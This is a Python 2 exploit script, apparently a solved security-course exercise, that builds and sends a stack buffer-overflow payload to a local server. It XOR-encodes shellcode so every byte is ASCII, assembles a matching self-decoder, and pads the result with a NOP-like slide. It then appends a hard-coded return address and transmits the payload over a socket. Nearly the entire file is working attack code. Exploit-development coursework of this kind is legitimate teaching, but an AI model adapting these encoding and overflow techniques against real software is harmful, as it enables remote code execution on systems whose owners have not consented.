#!/usr/bin/python

import functools, os, socket, traceback, struct, assemble
import q2


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)
    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(ord(c) > ASCII_MAX for c in selector(ret)):
                print('WARNING: Non ASCII chars in return value from %s at\n%s'
                      % (func.__name__, ''.join(traceback.format_stack()[:-1])))
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda (x,y): x)
def encode(data):
    '''Encode data to be valid ASCII, by XOR-ing non ASCII bytes with 0xff.

    Return the encoded data and the indices that were XOR-ed.
    - To return multiple values, do `return a, b`
    - To get multiple returned values do `a, b = encode(data)`
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    xor_indces = []
    new_shellcode = ""
    ascii_xor = 0xff
    for i in range(len(data)):
        code_byte = struct.unpack("B", data[i])[0] # convert to unsigned byte numeric type
        if code_byte > ASCII_MAX:
            code_byte ^= ascii_xor # xor with 0xff
            code_byte = struct.pack("B", code_byte) # pack again to unsigned byte
            new_shellcode += code_byte # append to new shellcode
            xor_indces.append(i) # mark index that was xor'ed
        else:
            new_shellcode += data[i] # else, don't change data
    return new_shellcode, xor_indces


@warn_invalid_ascii()
def get_decoder(indices):
    '''Return the assembled decoder code.'''
    # TODO: IMPLEMENT THIS FUNCTION
    create_ff = "push 0; pop ebx; dec ebx;" # insert into ebx the value ff with only ascii chars
    init_edx = "push 0; pop edx;" # initiate edx to zero
    decoder_assembly = create_ff + init_edx

    current_value = 0
    for i in indices:
        index_diff = i - current_value # this is how much we should increment edx for current i vaule
        inc = "inc eax;" * index_diff # do as much increment as needed
        xr = "xor byte ptr [eax], BL;" # then, perform the decoding
        decoder_assembly += inc + xr # update our decoder code
        current_value += index_diff # update current edx value

    decoder = assemble.assemble_data(decoder_assembly) # assemble our code
    return decoder


@warn_invalid_ascii()
def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.

    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''
    q2_shellcode = get_raw_shellcode()
    # TODO: IMPLEMENT THIS FUNCTION
    shellcode_length = len(q2_shellcode) # shellcode length doesn't change after 
    encoded_shellcode, indices = encode(q2_shellcode)
    decoder_shellcode = get_decoder(indices)
    # print len(decoder_shellcode)
    # print shellcode_length

    init_to_esp = "push esp; pop eax;" # init eax as esp value
    sub_eax = "dec eax;" * (shellcode_length + 4) # subtract from esp shellcode length + 4 bytes of RET
    # after these two lines eax should contains the value 0xbfffe0e1 which is the beginnig of the shellcode
    init_eax = init_to_esp + sub_eax
    init_eax_assm = assemble.assemble_data(init_eax)
    total_shellcode = init_eax_assm + decoder_shellcode + encoded_shellcode
    # print [hex(struct.unpack("B", b)[0]) for b in init_eax_assm]
    return total_shellcode


@warn_invalid_ascii(lambda x: x[4:-4])
def get_payload():
    '''This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''
    # TODO: IMPLEMENT THIS FUNCTION

    # new_nop = "inc edi;"
    # nop = assemble.assemble_data(new_nop)
    # print [hex(struct.unpack("B", b)[0]) for b in nop]

    desired_shell_length = 1040 # as explained in q1
    new_nop = '\x4e' # this is the instruction 'dec esi'. we replace our nop with this
    shellcode = get_shellcode()
    shellcode_length = len(shellcode)
    address_to_return = struct.pack('<I', 0xbfffddc3) # this is the address in the middle of the NOPs slide
    # this time our nops slide is short only ~200 bytes so we will jump 100 bytes after the begining of the buffer

    # full structe - slide NOPs, init eax with encoded shellcode address, decoder, shellcode, address to return
    message = new_nop * (desired_shell_length - shellcode_length) + shellcode + address_to_return

    message_length = len(message)
    message_length_newtork_order = struct.pack('>L', message_length) # add size as in q1

    return message_length_newtork_order + message # return payoload - message + size


def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
